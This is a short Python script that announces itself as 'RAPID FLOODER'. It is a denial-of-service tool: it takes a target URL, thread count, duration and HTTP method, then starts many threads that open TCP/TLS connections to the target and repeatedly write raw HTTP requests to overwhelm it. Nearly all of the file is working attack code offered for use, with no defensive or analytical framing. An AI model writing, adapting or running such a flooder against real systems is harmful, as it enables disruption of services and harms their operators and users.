import socket,ssl,threading,struct
from MODEL.data import get_target

def RAPID_PACKET(s,ssl_context,byt,times,methods):
    for _ in range(times):
     try:
        ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
        for _ in range(650):
            ssl_socket.write(byt)
            ssl_socket.send(byt)
            ssl_socket.sendall(byt)
            ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
     except:s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((str(target['host']),int(target['port']))); s.connect_ex((str(target['host']),int(target['port']))); byt = f"{methods} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode(); ssl_context = ssl.SSLContext()

def RAPID(target,methods,duration_sec_attack_dude):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(target['port'])))
            s.connect_ex((str(target['host']),int(target['port'])))
            byt = f"{methods} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            ssl_context = ssl.SSLContext()
            for _ in range(15):threading.Thread(target=RAPID_PACKET,args=(s,ssl_context,byt,duration_sec_attack_dude,methods)).start()
        except:pass

import sys
url = ''
METHODS = ''
time_booter = 0
thread_lower = 0
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO RAPID FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHOD>')
target = get_target(url)
for _ in range(int(thread_lower)):
    for _ in range(15):threading.Thread(target=RAPID,args=(target,METHODS,time_booter)).start()